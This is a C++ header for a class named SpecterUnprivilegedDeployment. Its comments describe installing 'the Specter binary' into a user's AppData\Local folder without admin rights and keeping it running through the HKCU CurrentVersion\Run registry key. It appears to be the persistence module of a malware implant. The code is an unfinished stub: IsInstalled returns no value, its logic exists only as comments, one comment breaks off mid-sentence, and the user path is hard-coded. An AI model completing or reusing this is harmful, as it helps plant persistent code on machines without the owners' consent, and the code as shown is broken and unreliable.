#pragma once
#include <filesystem>
#include <string>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>


// This class is responsible for deploying the Specter binary into the machine without any admin privileges
// Deploy to the AppData/Local folder, and ensures persistence by using the HKCU persistence method and 
class SpecterUnprivilegedDeployment
{
	static constexpr HKEY kTargetRegistryRoot = HKEY_CURRENT_USER;
	static inline const std::wstring kTargetRegistry = L"Microsoft\\Windows\\CurrentVersion\\Run";

	const std::filesystem::path kTargetFile;

public:
	SpecterUnprivilegedDeployment(const std::string& targetFileName) : // TODO what happens if the targetFileName isn't the one already installed? Need to flesh out the edge cases...
		kTargetFile(GetAppDataLocalPath() / targetFileName)
	{
		
	}

	static std::filesystem::path GetAppDataLocalPath()
	{
		return L"C:\\Users\\Alex\\AppData\\Local";
	}

	static bool IsInstalled()
	{
		HKEY result;

		auto status = RegOpenKeyW(kTargetRegistryRoot, kTargetRegistry.c_str(), &result);

		// If Registry key doesn't exist, then persistence doesn't work, it's not fully installed at this point, requires installation

		// If the key does indeed eixst, then we check if the file exists, if not, it's not installed at all, and needs repairing
		//   Repairing will be a separate function that we simply overwrite the target 

		// If the key does exist, and the file exists, we check if we ShouldUpgrade

		// If we ShouldUpgrade, we simply 
	}

	static bool ShouldUpgrade();

	static bool Install();
};
